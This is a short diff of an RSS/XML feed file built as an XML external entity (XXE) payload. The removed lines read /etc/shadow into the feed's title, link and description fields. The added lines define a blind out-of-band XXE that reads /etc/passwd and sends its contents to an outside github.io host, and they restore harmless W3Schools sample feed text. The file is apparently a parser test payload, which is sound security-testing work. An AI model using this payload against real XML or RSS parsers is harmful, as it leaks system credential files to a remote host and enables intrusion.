@@ -1,15 +1,18 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
+<!DOCTYPE foo [
+<!ELEMENT foo (#ANY)>
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY blind SYSTEM "https://env3lop3.github.io/?%xxe;">]><foo>&blind;</foo>
 <rss version="2.0">
 
 <channel>
-  <title>&xxe;</title>
-  <link>&xxe;</link>
-  <description>&xxe;</description>
+  <title>W3Schools Home Page</title>
+  <link>https://www.w3schools.com</link>
+  <description>Free web building tutorials</description>
   <item>
-    <title>&xxe;</title>
-    <link>&xxe;</link>
-    <description>&xxe;</description>
+    <title>RSS Tutorial</title>
+    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
+    <description>New RSS tutorial on W3Schools</description>
   </item>
   <item>
     <title>XML Tutorial</title>
